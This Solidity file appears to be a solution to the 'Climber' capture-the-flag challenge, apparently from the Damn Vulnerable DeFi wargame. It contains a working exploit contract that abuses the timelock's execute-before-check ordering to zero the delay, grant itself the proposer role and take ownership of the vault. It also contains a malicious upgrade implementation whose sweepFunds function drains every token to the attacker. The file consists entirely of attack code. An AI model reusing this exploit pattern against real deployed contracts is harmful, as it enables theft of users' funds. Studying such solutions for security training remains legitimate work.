// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../climber/ClimberTimelock.sol";

/**
 * @title General Attacker
 * @author kyrers
 * @notice This contract executes the attack to the point of making our attacker account the owner of the vault.
 */
contract ClimberAttacker {
    ClimberTimelock climberTimelock;
    address private immutable originalVault;
    address private immutable attacker;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(address _climberTimelock, address _originalVault) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
        originalVault = _originalVault;
        attacker = msg.sender;
    }

    function push(address _address, uint256 _value, bytes memory _dataElement) private {
        targets.push(_address);
        values.push(_value);
        dataElements.push(_dataElement);
    }

   function attack() external {
        //Update the delay to 0
        push(address(climberTimelock), 0, abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        //Grant this contract the proposer role
        push(address(climberTimelock), 0, abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        //Transfer ownership of the vault to our attacker account
        push(originalVault, 0, abi.encodeWithSignature("transferOwnership(address)", attacker));

        //Schedule the proposal during execution so it doesn't revert
        push(address(this), 0, abi.encodeWithSelector(this.scheduleProposal.selector));

        //Start execution
        climberTimelock.execute(targets, values, dataElements, 0);
   }

   function scheduleProposal() public {
        //Schedule the proposal that's being executed already so the last require statement in the ClimberTimelock contract doesn't revert
        climberTimelock.schedule(targets, values, dataElements, 0);
    }
}

/**
 * @title Vault Attacker
 * @author kyrers
 * @notice This is the compromised vault. Implements the needed functions + a sweepFunds function that does not require us to be the sweeper, only the owner
 */
contract CompromisedVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {
    }
}
